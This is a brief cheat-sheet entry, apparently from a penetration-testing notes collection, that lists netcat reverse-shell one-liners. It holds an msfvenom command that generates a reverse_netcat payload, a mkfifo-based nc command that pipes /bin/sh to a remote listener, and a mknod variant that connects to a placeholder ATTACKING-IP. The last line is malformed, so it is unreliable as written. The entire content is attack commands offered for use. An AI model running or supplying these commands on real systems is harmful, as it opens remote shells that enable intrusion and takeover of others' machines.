# Netcat

```text
msfvenom -p cmd/unix/reverse_netcat lhost=0.0.0.0 lport=9999 R → auto generate, can be perl or python instead of netcat

mkfifo /tmp/lnyzdr; nc 0.0.0.0 9999 0</tmp/lnyzdr | /bin/sh >/tmp/lnyzdr 2>&1; rm /tmp/lnyzdr  → host

rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```
